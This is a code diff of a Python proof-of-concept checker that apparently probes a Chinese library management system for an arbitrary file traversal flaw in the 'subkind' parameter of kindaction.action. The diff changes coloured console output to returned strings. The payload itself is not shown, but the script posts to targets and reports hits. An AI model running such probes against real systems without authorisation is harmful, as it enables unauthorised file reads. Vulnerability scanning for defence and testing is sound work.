@@ -9,8 +9,8 @@ description: 文件kindaction.action中,参数subkind存在任意文件遍历。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class clib_kindaction_fileread_BaseVerify:
     def __init__(self, url):
@@ -35,12 +35,12 @@ class clib_kindaction_fileread_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"system" in req.text:
-                cprint("[+]存在五车图书管系统kindaction任意文件遍历漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在五车图书管系统kindaction任意文件遍历漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = clib_kindaction_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
